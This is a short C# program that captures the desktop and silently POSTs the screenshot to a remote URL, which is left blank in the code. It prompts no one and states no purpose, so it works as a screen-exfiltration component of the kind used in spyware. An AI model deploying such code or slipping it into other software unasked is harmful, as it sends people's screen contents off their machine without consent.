using System.Drawing;
using System.Net;

namespace screen_capture
{
    class Program
    {
        static void Main()
        {
            string url = "";
            //ScreenCapture.CaptureDesktop().Save(@"\screen.jpg", System.Drawing.Imaging.ImageFormat.Jpeg);

            //ScreenCapture.CaptureActiveWindow().Save(@"\window.jpg", System.Drawing.Imaging.ImageFormat.Jpeg);

            using (var wc = new WebClient())
            {
                wc.UploadData(url, "POST", ImageToByte(ScreenCapture.CaptureDesktop()));
            }
        }

        public static byte[] ImageToByte(Image img)
        {
            ImageConverter converter = new ImageConverter();
            return (byte[])converter.ConvertTo(img, typeof(byte[]));
        }
    }
}